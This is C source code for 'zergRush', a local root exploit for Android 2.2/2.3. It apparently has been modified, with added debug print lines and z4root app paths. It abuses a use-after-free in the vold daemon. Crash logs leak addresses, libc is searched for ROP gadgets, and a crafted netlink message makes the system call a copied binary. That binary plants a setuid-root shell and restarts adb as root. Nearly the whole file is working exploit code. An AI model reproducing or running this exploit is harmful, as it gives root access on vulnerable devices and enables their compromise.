/* android 2.2/2.3 libsysutils root exploit use-after-free
 *
 * Exploited by rewriting a FrameworkCommand object making the runCommand
 * point to our first ROP gadget.
 *
 * Copyright (c) 2011, The Revolutionary development team.
 *
 * Before using, insert empty formatted sdcard. USE IT AT YOUR OWN RISK,
 * THIS PROGRAM MIGHT NOT WORK OR MAKES YOUR DEVICE USELESS/BRICKED.  SO BE
 * WARNED!  I AM NOT RESPONSIBLE FOR ANY DAMAGE IT MIGHT CAUSE!
 *
 * It only works if called from adb shell since we need group log.
 *
 * Compile:
 * agcc zergRush.c -o zergRush -ldiskconfig -lcutils
 *
 */

#include "jni.h"
#include <sys/stat.h>
#include <linux/netlink.h>
#include <math.h>
#include <elf.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>

#include <dirent.h>

#include <dlfcn.h>

#include <sys/system_properties.h>
#include <cutils/sockets.h>
#include <private/android_filesystem_config.h>

static pid_t logcat_pid = 0;
static char *sh = "/data/data/com.z4mod.z4root2/files/sh";
static char *bsh = "/data/data/com.z4mod.z4root2/files/boomsh";
static char *crashlog = "/data/data/com.z4mod.z4root2/files/crashlog";
static char *vold = "/system/bin/vold";

uint32_t heap_addr;
uint32_t libc_base;
uint32_t heap_base_addr;
uint32_t heap_offset;
uint32_t r9 = 0, r10 = 0, fp = 0;
uint32_t stack_addr = 0x41414141;
uint32_t system_ptr = 0;
uint32_t stack_pivot = 0x41414141;
uint32_t pop_r0 = 0x41414141;
uint32_t jumpsz = 0;
uint32_t gadget_jumpsz = 108;
uint32_t buffsz = 0;
uint32_t allbuffsz[] = {16,24,0};

uint8_t adjust = 0;

uint8_t samsung = 0;

extern char **environ;


static void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


static int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}


static int remount_data(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	memset(buf, 0, sizeof(buf));
	for (;!feof(f);) {
		if (fgets(buf, sizeof(buf), f) == NULL)
			break;
		if (strstr(buf, mntpoint)) {
			found = 1;
			break;
		}
	}
	fclose(f);
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL)
		return -1;
	if (strtok(NULL, " \t") == NULL)
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL)
		return -1;
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
}


static void *find_symbol(char *sym)
{
	void *r = NULL;
	void *dlh = dlopen("/system/libc/libc.so", RTLD_NOW);

	if (!dlh)
		die("[-] dlopen");
	if ((r = (void *)dlsym(dlh, sym)) == NULL)
		die("[-] dlsym");
	dlclose(dlh);
	return r;
}


static int bad_byte(uint8_t byte)
{
	switch(byte) {
		case 0x20:
		case 0x22:
		case 0x5c:
		case 0x00:
			return 1;
			break;
		default:
			break;
	}
	return 0;
}


static void heap_oracle() {
	char ok = 1;
	if (r9 > heap_base_addr && r9 < (heap_base_addr+0x10000))
		heap_addr = r9 + 0x70;
	else if (r10 > heap_base_addr && r10 < (heap_base_addr+0x10000))
		heap_addr = r10 + 0x70;
	else if (fp > heap_base_addr && fp < (heap_base_addr+0x10000))
		heap_addr = fp + 0x70;
	else
		ok = 0;

	while(bad_byte(heap_addr&0xff)) heap_addr += 0x20;
	if(ok)
		printf("[+] Overseer found a path ! 0x%08x\n", heap_addr);
	else {
		printf("[-] No path found, let's hope ...\n");
		heap_addr = heap_base_addr + heap_offset;
	}
}


static int check_addr(uint32_t addr)
{
	/*
	 * Check if address contains one of the forbidden bytes
	 */
	int i = 0;

	for(i=0; i<32; i+=8)
		if(bad_byte((addr>>i) & 0xff))
			return -1;

	return 0;
}

static int find_vold()
{
	char buf[2048], *ptr = NULL;
	int i = 0, fd;
	pid_t found = 0;
	FILE *f = NULL;


	if ((f = fopen("/proc/net/netlink", "r")) == NULL)
		die("[-] fopen");

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strtok(buf, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if (!*ptr)
			break;
		i = atoi(ptr);
		if (i <= 1)
			continue;
		sprintf(buf, "/proc/%d/cmdline", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (strstr(buf, "/system/bin/vold")) {
			found = i;
			break;
		}
        }
	fclose(f);
	if (!found)
		return -1;

	return found;
}




static int do_fault()
{
	char buf[255];
	int sock = -1, n = 0, i;
	char s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5];
	uint32_t bsh_addr;
	char padding[128];
	int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);

	//***************************************//
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = AF_NETLINK;
	//***************************************//
	if(samsung) {
		printf("[*] Sleeping a bit (~40s)...\n");
		sleep(40);
		printf("[*] Waking !\n");
	}

	memset(padding, 0, 128);
	strcpy(padding, "LORDZZZZzzzz");
	if(padding_sz > 0) {
		memset(padding+12, 'Z', padding_sz);
		printf("[*] Popping %d more zerglings\n", padding_sz);
	}
	else if(padding_sz < 0) {
		memset(padding, 0, 128);
		memset(padding, 'Z', 12+padding_sz);
	}

	//***************************************//
	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");
	snl.nl_pid = find_vold();
	//***************************************//
//	if ((sock = socket_local_client("vold", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0)
//		die("[-] Error creating Nydus");

	sprintf(s_stack_addr, "%c%c%c%c", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff);
	sprintf(s_stack_pivot_addr, "%c%c%c%c", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff);
	sprintf(s_pop_r0_addr, "%c%c%c%c", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff);
	sprintf(s_system, "%c%c%c%c", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff);
	sprintf(s_heap_addr, "%c%c%c%c", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff);

	if(adjust)
		strcpy(buf, "ZERGZERG");
	else
		strcpy(buf, "ZERG");
	strcat(buf, " ZZ ");
	strcat(buf, s_stack_pivot_addr);
	for(i=3; i < buffsz+1; i++)
		strcat(buf, " ZZZZ");
	strcat(buf, " ");
	strcat(buf, s_heap_addr);

	n = strlen(buf);
	bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4;

	if(check_addr(bsh_addr) == -1) {
		printf("[-] Colossus, we're doomed!\n");
		exit(-1);
	}

	sprintf(s_bsh_addr, "%c%c%c%c", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff);

	n += sprintf(buf+n+1, "%s%s OVER%s%s%s%sZZZZ%s%c", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);

	printf("[*] Sending %d zerglings ...\n", n);

	//***************************************//
	msg.msg_iov->iov_len = n;
	if ((n = sendmsg(sock, &msg, 0)) < 0)
		die("[-] Nydus seems broken");
	//***************************************//

//	if ((n = write(sock, buf, n+1)) < 0)
//		die("[-] Nydus seems broken");

	sleep(3);
	close(sock);

	return n;
}


static int find_rop_gadgets()
{
	/*
	 * add sp, #108 -> b01b
	 * pop	{r4, r5, r6, r7, pc} -> bdf0
	 *
	 * pop	{r0, pc} -> bd01
	 */
	int fd;
	char r[2], d[2];
	int n = 2;
	int bad = 0;

	if((fd=open("/system/lib/libc.so", O_RDONLY)) == -1)
		die("[-] open");

	lseek(fd, 0x10000, SEEK_SET);

	while(n == 2 && (stack_pivot == 0x41414141 || pop_r0 == 0x41414141)) {
		n = read(fd, r, 2);
		switch(r[0]) {
		case '\x1b':
			if(stack_pivot == 0x41414141) {
				if(r[1] == '\xb0') {
					n = read(fd, d, 2);
					if(d[0] == '\xf0' && d[1] == '\xbd') {
						stack_pivot = libc_base + lseek(fd, 0, SEEK_CUR) - 4 + 1;
						if(check_addr(stack_pivot) == -1)
							stack_pivot = 0x41414141;
					}
				}
			}
			break;
		case '\x01':
			if(pop_r0 == 0x41414141) {
				if(r[1] == '\xbd') {
					pop_r0 = libc_base + lseek(fd, 0, SEEK_CUR) - 2 + 1;
					if(check_addr(pop_r0) == -1)
						pop_r0 = 0x41414141;
				}
			}
			break;
		default:
			break;
		}
	}

	if (stack_pivot == 0x41414141) {
		printf("[-] You need more minerals !\n");
		bad = -1;
	}

	if (pop_r0 == 0x41414141) {
		printf("[-] You need more vespene gas !\n");
		bad = -1;
	}

	if(bad == -1)
		exit(-1);

	return 0;
}


static uint32_t checkcrash()
{
	printf("\n[**] yangxueping's checkcrash1111111+++++++++++++++\n");
	uint32_t fault_addr = 0;
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;
	int ret=0;
	printf("\n[**] yangxueping's checkcrash22222222+++++++++++++++\n");
	system("/system/bin/logcat -c");
	unlink(crashlog);
	printf("\n[**] yangxueping's checkcrash33333333333+++++++++++++++\n");
	if ((logcat_pid = fork()) == 0) {
		printf("\n[**] yangxueping's checkcrash4444+++++++++++++++\n");
		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
		execve(*a, a, environ);
		printf("\n[**] yangxueping's checkcrash55555555555+++++++++++++++\n");
		exit(1);
	}
	sleep(3);
	printf("\n[**] yangxueping's checkcrash6666666666+++++++++++++++\n");
	if (do_fault() < 0)
		die("[-] Zerglings did not cause crash");
	printf("\n[**] yangxueping's checkcrash7777777777+++++++++++++++\n");
	/* Give logcat time to write to file
	 */
	sleep(3);
	if ((f = fopen(crashlog, "r")) == NULL)
		die("[-] Zerglings did not leave stuff at all");
	printf("\n[**] yangxueping's checkcrash88888888888+++++++++++++++\n");
	fseek(f, pos, SEEK_SET);
	do {
		//printf("\n[**] yangxueping's checkcrash999999999999+++++++++++++++\n");
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strstr(buf, "  sp ")) != NULL)
			ret = 1;
		if ((ptr = strstr(buf, "  r9 ")) != NULL) {
			ptr += 5;
			r9 = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  10 ")) != NULL) {
			ptr += 5;
			r10 = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  fp ")) != NULL) {
			ptr += 5;
			fp = (uint32_t)strtoul(ptr, NULL, 16);
		}
		//printf("\n[**] yangxueping's checkcrash1000000000000+++++++++++++++\n");
	} while (!feof(f));
	pos = ftell(f);
	fclose(f);
	printf("\n[**] yangxueping's checkcrash122222222222222+++++++++++++++\n");
	return ret;
}


static uint32_t check_libc_base()
{
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;
	int ret=0;
	uint32_t spotted_base = 0;

	if ((f = fopen(crashlog, "r")) == NULL)
		die("[-] Zerglings did not leave stuff at all");
	fseek(f, pos, SEEK_SET);
	do {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strstr(buf, "  /system/lib/libc.so")) != NULL) {
			ptr -= 8;
			spotted_base = strtoul(ptr, NULL, 16) & 0xfff00000;
			if(spotted_base && spotted_base != libc_base) {
				libc_base = spotted_base;
				ret = 1;
			}
		}
	} while (!feof(f) && !spotted_base);
	pos = ftell(f);
	fclose(f);

	return ret;
}


static uint32_t find_stack_addr()
{
	printf("\n[**] yangxueping's find_stack_addr1111111+++++++++++++++\n");
	uint32_t fault_addr = 0;
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;
	uint32_t sp=0, over=0;
	printf("\n[**] yangxueping's find_stack_addr22222222+++++++++++++++\n");
	system("/system/bin/logcat -c");
	unlink(crashlog);
	printf("\n[**] yangxueping's find_stack_add333333333+++++++++++++++\n");
	if ((logcat_pid = fork()) == 0) {
		printf("\n[**] yangxueping's find_stack_addr444444444+++++++++++++++\n");
		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
		execve(*a, a, environ);
		printf("\n[**] yangxueping's find_stack_addr5555555555+++++++++++++++\n");
		exit(1);
	}
	sleep(3);
	printf("\n[**] yangxueping's find_stack_addr66666666+++++++++++++++\n");
	if (do_fault() < 0)
		die("[-] Zerglings did not cause crash");
	printf("\n[**] yangxueping's find_stack_addr77777777+++++++++++++++\n");
	/* Give logcat time to write to file
	 */
	sleep(3);
	if ((f = fopen(crashlog, "r")) == NULL)
		die("[-] Zerglings did not leave stuff at all");
	printf("\n[**] yangxueping's find_stack_addr88888888888+++++++++++++++\n");
	fseek(f, pos, SEEK_SET);
	do {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strstr(buf, "  4752455a")) != NULL && stack_addr == 0x41414141) {
			ptr -= 8;
			stack_addr = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  5245564f")) != NULL && !over) {
			ptr -= 8;
			over = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  sp ")) != NULL && !sp) {
			ptr += 5;
			sp = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  r9 ")) != NULL) {
			ptr += 5;
			r9 = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  10 ")) != NULL) {
			ptr += 5;
			r10 = (uint32_t)strtoul(ptr, NULL, 16);
		}
		if ((ptr = strstr(buf, "  fp ")) != NULL) {
			ptr += 5;
			fp = (uint32_t)strtoul(ptr, NULL, 16);
		}
		//printf("\n[**] yangxueping's find_stack_addr9999999999999+++++++++++++++\n");
	} while (!feof(f));
	pos = ftell(f);
	fclose(f);
	printf("\n[**] yangxueping's find_stack_addr1000000+++++++++++++++\n");
	if(over && sp)
		jumpsz = over - sp;

	return stack_addr;
}


static void do_root()
{
	remount_data("/data");
	chown(sh, 0, 0);
	chmod(sh, 04711);
	property_set("ro.kernel.qemu","1");
	exit(0);
}


int main(int argc, char **argv, char **env)
{
	uint32_t i = 0, ok = 0;
	char *ash[] = {sh, 0};
	struct stat st;
	char version_release[1024];
	int tries=0;

	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
		do_root();

	printf("\n[**] Zerg rush - Android 2.2/2.3 local root\n");
	printf("[**] (C) 2011 Revolutionary. All rights reserved.\n\n");
	printf("[**] Parts of code from Gingerbreak, (C) 2010-2011 The Android Exploid Crew.\n\n");

	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	chmod(bsh, 0711);

	stat(vold, &st);
	heap_base_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;

	__system_property_get("ro.build.version.release", version_release);

	if (strstr(version_release, "2.2")) {
		heap_offset = 0x108;
		printf("[+] Found a Froyo ! 0x%08x\n", heap_offset);
	} else if (strstr(version_release, "2.3")) {
		heap_offset = 0x118;
		printf("[+] Found a GingerBread ! 0x%08x\n", heap_offset);
	} else {
		printf("[-] Not a 2.2/2.3 Android ...\n");
		exit(-1);
	}

	heap_addr = 0xffffff;

	__system_property_get("ro.build.fingerprint", version_release);
	if(!strncmp(version_release, "samsung", 7)) {
		printf("[+] Found a Samsung, running Samsung mode\n");
		samsung = 1;
	}


	system_ptr = (uint32_t) find_symbol("system");
	libc_base = system_ptr & 0xfff00000;

	if (check_addr(system_ptr) == -1) {
		printf("[-] High templars, we're doomed!\n");
		exit(-1);
	}

	tries = 0;
	printf("[*] Scooting ...\n");
	while(buffsz=allbuffsz[tries]) {
		if(checkcrash()) {
			printf("[+] Zerglings found a way to enter ! 0x%02x\n", buffsz);
			break;
		}
		tries++;
	}

	if(!buffsz) {
		printf("[-] Hellions with BLUE flames !\n");
		exit(-1);
	}

	for (tries = 0; tries < 2; tries++) {
		heap_oracle();
		find_stack_addr();

		if (stack_addr != 0x41414141 && jumpsz) {
			printf("[+] Zerglings caused crash (good news): 0x%08x 0x%04x\n", stack_addr, jumpsz);
			break;
		}
	}

	if (stack_addr == 0x41414141 || !jumpsz) {
		printf("[-] Zerglings did not leave interesting stuff\n");
		exit(-1);
	}

	if (check_addr(stack_addr) == -1) {
		if(bad_byte(stack_addr & 0xff)) {
			stack_addr += 4;
			adjust = 4;
			if (check_addr(stack_addr) == -1) {
				printf("[-] Siege tanks, we're doomed!\n");
				exit(-1);
			}
		}
		else {
			printf("[-] Siege tanks, we're doomed!\n");
			exit(-1);
		}
	}

	if (jumpsz > 108 + 12) {
		printf("[-] This terran has walled!\n");
		exit(-1);
	}

	if(check_libc_base()) {
		system_ptr = libc_base + (system_ptr & 0x000fffff);
		printf("[*] Creating more creep 0x%08x ...\n", system_ptr);

		if (check_addr(system_ptr) == -1) {
			printf("[-] High templars, we're doomed!\n");
			exit(-1);
		}
	}

	kill(logcat_pid, SIGKILL);
	unlink(crashlog);

	printf("[*] Researching Metabolic Boost ...\n");
	find_rop_gadgets();
	printf("[+] Speedlings on the go ! 0x%08x 0x%08x\n", stack_pivot, pop_r0);

	do_fault();
	stat(sh, &st);
	if ((st.st_mode & 04000) == 04000) {
		char qemuprop[1];

		printf("\n[+] Rush did it ! It's a GG, man !\n");
		property_get("ro.kernel.qemu",qemuprop,"0");

		if (qemuprop[0]=='1') {
			printf("[+] Killing ADB and restarting as root... enjoy!\n");
			fflush(stdout);
			sleep(1);
			kill(-1, SIGTERM);
		} else {
			printf("[-] Failed to set property to restart adb. Not killing.\n");
		}
	} else {
		printf("\n[-] Bad luck, our rush did not succeed :(\n");
		fflush(stdout);
		sleep(1);
		kill(-1, SIGTERM);
	}

	return 0;
}
